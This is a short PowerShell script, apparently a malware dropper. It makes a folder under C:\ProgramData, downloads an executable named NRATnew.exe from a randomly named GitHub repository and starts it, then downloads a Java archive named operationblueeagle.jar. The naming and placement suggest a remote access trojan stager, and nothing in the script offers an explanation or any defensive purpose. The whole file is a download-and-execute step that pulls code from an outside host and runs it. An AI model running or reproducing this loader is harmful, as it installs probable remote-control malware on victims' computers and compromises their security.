cd C:\ProgramData\zDATAxD
mkdir C:\ProgramData\zDATAxD\nratmyupdate
cd C:\ProgramData\zDATAxD\nratmyupdate
$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/NRATnew.exe'
$destination = 'C:\ProgramData\zDATAxD\nratmyupdate\NRATnew.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
start NRATnew.exe
$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/operationblueeagle.jar'
$destination = 'C:\ProgramData\zDATAxD\nratmyupdate\operationblueeagle.jar'
Invoke-WebRequest -Uri $source -OutFile $destination
